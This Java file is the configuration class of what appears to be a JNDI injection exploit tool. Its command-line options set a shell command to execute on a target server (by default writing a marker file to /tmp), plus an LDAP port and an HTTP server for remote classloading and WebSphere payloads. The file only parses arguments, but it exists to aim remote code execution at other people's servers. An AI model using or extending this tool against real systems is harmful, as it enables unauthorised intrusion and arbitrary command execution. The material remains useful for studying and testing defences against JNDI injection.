package com.rajasoun.jndi;

import com.beust.jcommander.JCommander;
import com.beust.jcommander.Parameter;
import com.beust.jcommander.UnixStyleUsageFormatter;

import java.net.InetAddress;
import java.net.UnknownHostException;

@SuppressWarnings("InstantiationOfUtilityClass")
public class Config {

    @Parameter(names = {"-c", "--command"}, description = "Command to execute on the target server", order = 0)
    public static String command = "echo -e \"$(date) \\n by $(hostname)\" > /tmp/attcked.txt";

    @Parameter(names = {"-n", "--hostname"}, description = "Local HTTP server hostname " +
            "(required for remote classloading and websphere payloads)", order = 1)
    public static String hostname;

    static {
        try { //try to get the local hostname by default
            hostname = InetAddress.getLocalHost().getHostAddress();
        } catch (UnknownHostException e) {
            hostname = "127.0.0.1";
        }
    }

    @Parameter(names = {"-l", "--ldapPort"}, description = "Ldap bind port", order = 2)
    public static int ldapPort = 1389;

    @Parameter(names = {"-p", "--httpPort"}, description = "Http bind port", order = 3)
    public static int httpPort = 8888;

    @Parameter(names = {"-h", "--help"}, help = true, description = "Show this help")
    private static boolean help = false;

    public static void applyCmdArgs(String[] args) {
        //process cmd args
        JCommander jc = JCommander.newBuilder()
                .addObject(new Config())
                .build();
        jc.parse(args);
        jc.setProgramName("java -jar target/jndi-exploit-1.0-SNAPSHOT-jar-with-dependencies.jar");
        jc.setUsageFormatter(new UnixStyleUsageFormatter(jc));

        if(help) {
            jc.usage(); //if -h specified, show help and exit
            System.exit(0);
        }
    }
}